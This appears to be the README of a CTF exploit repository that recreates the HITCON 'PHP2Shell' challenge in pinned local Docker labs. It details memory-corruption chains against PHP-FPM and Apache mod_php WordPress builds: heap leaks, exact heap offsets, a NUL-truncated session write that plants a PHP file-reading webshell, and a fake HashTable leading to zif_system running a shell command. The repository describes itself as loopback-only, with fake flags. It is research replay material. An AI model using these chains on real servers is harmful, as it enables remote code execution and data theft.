# PHP2Shell - versioned local profile recreation

This repository runs a complete **local 6/6 recreation** for six exact,
verified challenge shapes and keeps one PHP 8.2 FPM profile in fail-closed
calibration status:

- pinned Nginx/PHP-FPM 8.3.35/WordPress 7.1.3;
- pinned Nginx/PHP-FPM 8.4.26/WordPress 6.9.10;
- pinned Nginx/PHP-FPM 8.5.11/WordPress 6.9.10;
- pinned Apache/mod_php 8.3.35/WordPress 7.1.3;
- pinned Apache/mod_php 8.4.26/WordPress 7.0.7;
- pinned Apache/mod_php 8.5.11/WordPress 7.1.3;
- calibration-only Nginx/PHP-FPM 8.2.34/WordPress 7.1.3.

A public post described the random PHP pool only as **7.x / 8.x**;
the exact build list was not published. This repository therefore does not
claim branch-wide coverage. An affected version is not interchangeable with
an exploit profile: every executable entry below is tied to one exact build.

This is not an authentic HITCON solve. The organizer image and live instancer
were unavailable. Every profile is a local clone and every flag is deliberately
fake.

## Vulnerable range versus packaged support

| PHP branch | Vulnerable releases | Fixed release | Packaged WordPress profiles |
| --- | --- | --- | --- |
| 7.0–7.3 | all releases | none | none |
| 7.4 | all releases | source backport only | none |
| 8.0 | all releases | source backport only | none |
| 8.1 | all releases | source backport only | none |
| 8.2 | 8.2.0–8.2.34 | 8.2.35 | `fpm82` calibration only |
| 8.3 | 8.3.0–8.3.35 | 8.3.36 | exact 8.3.35 FPM and Apache |
| 8.4 | 8.4.0–8.4.26 | 8.4.27 | exact 8.4.26 FPM and Apache |
| 8.5 | 8.5.0–8.5.11 | 8.5.12 | exact 8.5.11 FPM and Apache |

The left columns describe vulnerability exposure. The right column describes
what this repository can actually exploit and verify. They are intentionally
not treated as equivalent.

## Profile status

| Profile | SAPI | PHP | WordPress | Status | Geometry |
| --- | --- | ---: | ---: | --- | --- |
| `fpm82` | FPM | 8.2.34 | 7.1.3 | **Calibration only; selector refuses execution** | Next stale-decoder store `BG.data+0x1598`; no HTTP-visible reclaim found |
| `fpm83` | FPM | 8.3.35 | 7.1.3 | Full local dummy-flag read | `P-B=0x8662000`, `Q-B=0x742d9d8` |
| `fpm84` | FPM | 8.4.26 | 6.9.10 | Full local dummy-flag read | Paired BIG/P/Q candidate tuples |
| `fpm85` | FPM | 8.5.11 | 6.9.10 | Full local dummy-flag read | Bounded local P/Q candidate sets |
| `apache83` | mod_php | 8.3.35 | 7.1.3 | Full local dummy-flag copy | Version-specific A1 and stale-ID offset `0xe2968` |
| `apache84` | mod_php | 8.4.26 | 7.0.7 | Full local dummy-flag copy | Public A1/B1/A2/B2 geometry |
| `apache85` | mod_php | 8.5.11 | 7.1.3 | Full local dummy-flag copy | Two-400-page B1 and zero-tail B2 |

`profile_registry.py` is the single support contract. It records the complete
vulnerable branch ranges, the public 7.x/8.x randomization statement and the
smaller exact-build exploit matrix. Selection requires an exact SAPI, PHP,
WordPress, INI and architecture match. There is no branch, nearest-version or
offset fallback. `select_profile.py` returns exit status 2 for an unknown or
calibrating fingerprint.

```bash
python3 profile_registry.py
python3 select_profile.py --container php2shell-fpm83 --sapi fpm \
  --docker-command docker.exe
python3 select_profile.py --container php2shell-fpm82 --sapi fpm \
  --docker-command docker.exe  # intentionally fails closed
```

All verified FPM solvers also repeat their exact PHP, WordPress and INI checks
before using profile-specific payload geometry. They accept loopback targets
only and have no remote-host mode.

```text
FPM 8.3    -> seed -> leak -> R2a -> R2b -> R3 -> flag A
FPM 8.4    -> seed -> leak -> R2a -> R2b -> R3 -> flag B
FPM 8.5    -> seed -> leak -> R2a -> R2b -> R3 -> flag C
Apache 8.3 -> A1 -> B1 leak -> A2 -> B2 -> flag D
Apache 8.4 -> A1 -> B1 leak -> A2 -> B2 -> flag E
Apache 8.5 -> A1 -> B1 leak -> A2 -> B2 -> flag F
```

No verified exploit stage uses GDB. Docker is used to build/restart the local
labs and to verify local FPM worker/session state that would not be available
remotely.

## Files

```text
.
├── profile_registry.py       # vulnerable ranges plus exact support fingerprints
├── select_profile.py         # local container fingerprint selector
├── solve_all.py              # runs all selected verified exact profiles
├── solve.py                  # PHP 8.5 FPM chain
├── payloads.py               # PHP 8.5 multipart builders
├── profiles/fpm82/           # calibration-only PHP 8.2.34 clone
├── profiles/fpm83/
│   ├── solve.py              # PHP 8.3 FPM chain
│   ├── payloads.py           # PHP 8.3 multipart builders
│   └── compose.yaml
├── profiles/fpm84/
│   ├── solve.py              # PHP 8.4 FPM chain
│   ├── payloads.py           # PHP 8.4 multipart builders
│   ├── calibrate.py          # bounded loopback leak calibration
│   └── compose.yaml
├── profiles/apache83/        # one-worker PHP 8.3/WordPress lab
├── profiles/apache85/        # one-worker PHP 8.5/WordPress lab
├── apache/
│   ├── solve.py              # versioned Apache A1/B1/A2/B2 runner
│   └── payloads.py           # exact Apache 8.3/8.4/8.5 builders
├── lab/
│   ├── compose.yaml          # disposable PHP 8.5 FPM target
│   ├── install.py            # loopback WordPress installer/primer
│   └── apache/               # Apache 8.4/WordPress lab
└── evidence/                 # sanitized local result evidence
```

No third-party Python package is required.

All PHP, Nginx and MariaDB images are pinned by digest. WordPress archives are
also pinned by URL and SHA-256 before extraction.

## Full local 6/6 run

Requirements:

- Docker with Compose;
- Python 3.11+;
- around 4 GB free memory for the 150-worker Apache 8.4 profile;
- loopback ports `18233`, `18234`, `18235`, `18322`, `18323` and `18325` available.

The offline plan does not start containers or send requests:

```bash
python3 solve_all.py
```

Run the complete local recreation:

```bash
python3 solve_all.py --execute
```

If Docker Desktop is exposed through the Windows CLI rather than a WSL Docker socket:

```bash
python3 solve_all.py --execute --docker-command docker.exe
```

A successful run returns:

```text
hitcon{local_fpm83_instance_do_not_submit}
hitcon{local_fpm84_instance_do_not_submit}
hitcon{local_fpm85_instance_do_not_submit}
hitcon{local_apache83_instance_do_not_submit}
hitcon{local_apache_instance_do_not_submit}
hitcon{local_apache85_instance_do_not_submit}
6/6 local dummy flags across exact profiles
```

The offline plan includes the complete support contract. `--execute` runs only
verified exact profiles; it never treats `fpm82` or any unmatched 7.x/8.x
fingerprint as a substitute.

Select a subset or override bounded settings with `PROFILE=VALUE`:

```bash
python3 solve_all.py --profile apache83 --profile apache85
python3 solve_all.py --profile fpm83 --attempts fpm83=5 --port fpm83=19234
```

The runner tears down each container, network and database volume unless
`--keep-labs` is supplied. Request/response evidence stays under
`runs/full-local-*/` and is ignored by Git. The default clean-attempt counts
are three for FPM83/FPM84, five for FPM85, three for Apache84 and one for each
single-worker Apache profile. Every FPM retry recreates its database and
webroot volumes.

## PHP 8.5 profile

Copy the disposable database configuration, build the target and install WordPress:

```bash
cp lab/.env.example lab/.env
docker compose --env-file lab/.env -f lab/compose.yaml up -d --build
python3 lab/install.py --port 18233 --title HITCON-LAB-FPM85
```

The image pins PHP 8.5.11 and verifies the WordPress 6.9.10 archive hash:

```text
a1c0dc12e2271c6afaabf329d5af7a976f8d2c8c592773178a5baaeafc2d4f4a
```

Build and inspect the payload plan without sending requests:

```bash
python3 solve.py
```

Run the chain:

```bash
python3 solve.py --execute --restart-at-start
```

The solver tries only the bounded locally measured P/Q candidate sets printed by the offline plan. It refuses non-loopback hosts and mismatched PHP/WordPress/INI fingerprints.

## PHP 8.3 profile

Use a five-digit loopback port; `18234` is the default:

```bash
export DB_PASSWORD=local-test-password
export DB_ROOT_PASSWORD=local-test-root-password
export LOCAL_FLAG='hitcon{local_fpm83_dummy_do_not_submit}'
export LAB_PORT=18234
docker compose -f profiles/fpm83/compose.yaml up -d --build
python3 lab/install.py --port 18234 --title HITCON-LAB-FPM83
```

The image pins PHP 8.3.35 and verifies the WordPress 7.1.3 archive hash:

```text
d2a09acb6a15e3b9c471d72557753c266d6f41a79ed19bfe04cbfe49e283b2a5
```

Build and inspect the exact payload plan without sending requests:

```bash
python3 profiles/fpm83/solve.py
```

Run the chain:

```bash
python3 profiles/fpm83/solve.py --execute --restart-at-start \
  --accept-fixed-geometry --port 18234
```

The explicit acceptance flag is required because this profile uses fixed offsets measured on the pinned image. The solver requires PHP 8.3.35, WordPress 7.1.3, `memory_limit=128M`, upload progress enabled and `/tmp` session storage.

## PHP 8.4 profile

The profile uses loopback port `18235` and fixed geometry measured on the pinned image:

```bash
export DB_PASSWORD=local-test-password
export DB_ROOT_PASSWORD=local-test-root-password
export LOCAL_FLAG='hitcon{local_fpm84_dummy_do_not_submit}'
export LAB_PORT=18235
docker compose -f profiles/fpm84/compose.yaml up -d --build
python3 lab/install.py --port 18235 --title HITCON-LAB-FPM84
```

The image pins PHP 8.4.26 and verifies the WordPress 6.9.10 archive hash:

```text
a1c0dc12e2271c6afaabf329d5af7a976f8d2c8c592773178a5baaeafc2d4f4a
```

Inspect or execute the packaged chain:

```bash
python3 profiles/fpm84/solve.py
python3 profiles/fpm84/solve.py --execute --restart-at-start \
  --accept-fixed-geometry --port 18235
```

The depth-55 leak places fourteen aligned pointers at reflected value offsets `104..215`. Replacement workers use two observed BIG/Q lineages and two observed progress-object placements:

| `BIG` value − B | P − B | Q − B |
| ---: | ---: | ---: |
| `0x801a018` | `0x8862000` | `0x53a398` |
| `0x7e1a018` | `0x8862000` | `0x33a398` |
| `0x801a018` | `0x8a62000` | `0x53a398` |
| `0x7e1a018` | `0x8a62000` | `0x33a398` |

The solver tries each complete tuple; it never mixes BIG/Q offsets from different lineages. A missed R2a attempt preserves the seeded array, allowing bounded retries without resetting the lab.


## PHP 8.2 calibration boundary

`profiles/fpm82/` pins PHP 8.2.34 and WordPress 7.1.3 for allocator research,
but it intentionally has no `solve.py`:

```bash
export DB_PASSWORD=local-test-password
export DB_ROOT_PASSWORD=local-test-root-password
export LOCAL_FLAG='hitcon{local_fpm82_dummy_do_not_submit}'
export LAB_PORT=18232
docker compose -f profiles/fpm82/compose.yaml up -d --build
python3 lab/install.py --port 18232 --title HITCON-LAB-FPM82
python3 select_profile.py --container php2shell-fpm82 --sapi fpm
```

The final command returns exit status 2. On the exact pinned lineage, GDB
measured a stale `php_unserialize_data` at chunk offset `0x1e3000`, 682 used
embedded slots, and the next decoder store at `BG.data+0x1598`. The PHP 8.3
reflected-search request does not reclaim that location on PHP 8.2. Bounded
sweeps over producer routes, consumer depths, upload counts, field sizes,
padding and small-bin allocation counts yielded either an unchanged reflected
value or a worker crash. Neither result is an address disclosure or a usable
write primitive, so reusing the PHP 8.3 offsets would be unsafe.

## FPM chain

### Producer and stale decoder state

Each producer reaches `php_var_unserialize_init()`, publishes `BG(unserialize).data`, then hits the 128 MiB memory limit before matching cleanup. FPM handles the bailout and keeps the child alive, allowing the next multipart request to consume stale decoder state.

### Heap leak

WordPress reflects a 291-byte value in the search input. The solver validates the filler boundaries, canonical aligned pointer words and a single 2 MiB chunk base:

```python
B = leaked_pointer & ~0x1fffff
```

### R2a and R2b

R2a converts the seeded upload-progress value into one scalar root. R2b adds a second empty-array root. Those roots provide one then two controlled decoder stores:

```text
F->data[F->used_slots++] = source_zval_pointer
```

PHP 8.3 records:

```text
upload_progress_K|b:0;
upload_progress_K|b:0;upload_progress_J|a:0:{}
```

PHP 8.4 and 8.5 records:

```text
upload_progress_stockdwatch|i:0;
upload_progress_stockdwatch|i:0;upload_progress_K2stage0001|a:0:{}
```

### R3 webroot write

R3 redirects the files session handler to `/var/www/html/r3-<sid>.php\0`. PHP appends its normal session suffix, while the filesystem sees only the path before the NUL. The tracked upload filename is:

```php
<?=readfile('/flag')?>
```

Upload-progress serialization writes that string into the redirected session file. The final loopback GET executes it and returns the local dummy flag.


## Apache chain

All three Apache profiles use the same four-stage structure, but their stale-ID
placement, symbol offsets, heap selector and B2 layout are version specific:

```text
A1: memory bailout leaves the session ID state stale
B1: forged ID returns an 819200-byte cookie leak
A2: another bailout leaves session variables dangling
B2: fake reference -> fake HashTable -> zif_system
```

| Profile | Workers | B1 stale-ID offset | Fake HashTable offset | B2 variant |
| --- | ---: | ---: | ---: | --- |
| `apache83` | 1 | `0xe2968` | `main+0xf9398` | standard spray |
| `apache84` | 150, 149 held | page-calibrated public shape | `main+0xf8398` | standard spray |
| `apache85` | 1 | `0xe8080` | `main+0xf7398` | final spray value zeroed |

Inspect the exact request hashes without starting a lab:

```bash
python3 apache/solve.py --profile apache83
python3 apache/solve.py --profile apache84
python3 apache/solve.py --profile apache85
```

B1 discloses both `libphp` and the main Zend heap chunk. B2 runs
`cat /flag >/out/local_flag`. The selected child normally crashes after the
destructor callback, but the command completes first and Apache replaces it.
See [`apache/README.md`](apache/README.md) for the public research source used
for the payload geometry.

## Limits

These are **profile-specific local replays**, not a universal exploit for
arbitrary PHP installations. A public post reported random 7.x/8.x versions, but
the exact challenge build list is unavailable. This repository has no verified
WordPress profile for PHP 7.x, 8.0, 8.1, Apache 8.2, or FPM 8.2. A version
banner alone cannot select safe offsets.

The HTTP leaks do not remotely derive every allocator placement. Image build,
loaded extensions, allocator state, WordPress state, request geometry and web
server behavior remain part of each exact profile contract. Unknown
fingerprints fail closed instead of borrowing a nearby version's offsets.

The organizer image, real challenge instances, real flags and platform
acceptance remain unavailable. Every marker in this repository is local and
fake.

## Evidence

- [`evidence/fpm83-local.json`](evidence/fpm83-local.json): clean PHP-FPM 8.3 dummy-flag proof.
- [`evidence/fpm84-local.json`](evidence/fpm84-local.json): clean PHP-FPM 8.4 dummy-flag proof.
- [`evidence/fpm85-local.json`](evidence/fpm85-local.json): clean PHP-FPM 8.5 dummy-flag proof.
- [`evidence/apache83-local.json`](evidence/apache83-local.json): clean Apache 8.3 dummy-flag proof.
- [`evidence/apache84-local.json`](evidence/apache84-local.json): clean Apache 8.4 dummy-flag proof.
- [`evidence/apache85-local.json`](evidence/apache85-local.json): clean Apache 8.5 dummy-flag proof.
- [`evidence/full-local.json`](evidence/full-local.json): clean versioned 6/6 matrix run.
- [`evidence/results.json`](evidence/results.json): earlier single-profile local runs.

## Stopping standalone labs

```bash
docker compose --env-file lab/.env -f lab/compose.yaml down -v
docker compose -f profiles/fpm83/compose.yaml down -v
docker compose -f profiles/fpm84/compose.yaml down -v
docker compose -f profiles/apache83/compose.yaml down -v
docker compose -f lab/apache/compose.yaml down -v
docker compose -f profiles/apache85/compose.yaml down -v
```

## References

- <https://github.com/3em0/php2shell>
- <https://github.com/alvarodh5/php2shell>
- `9bie/php2shell`, commit `d6f888ebd3f0e188bb662e16f23747afdf35e42f`
- <https://x.com/brokenpacifist/status/2114361269369385145> (reported 7.x/8.x challenge randomization)
- <https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w>
- <https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp>

The code in this repository is MIT licensed. PHP, WordPress, Nginx and MariaDB retain their own licenses.
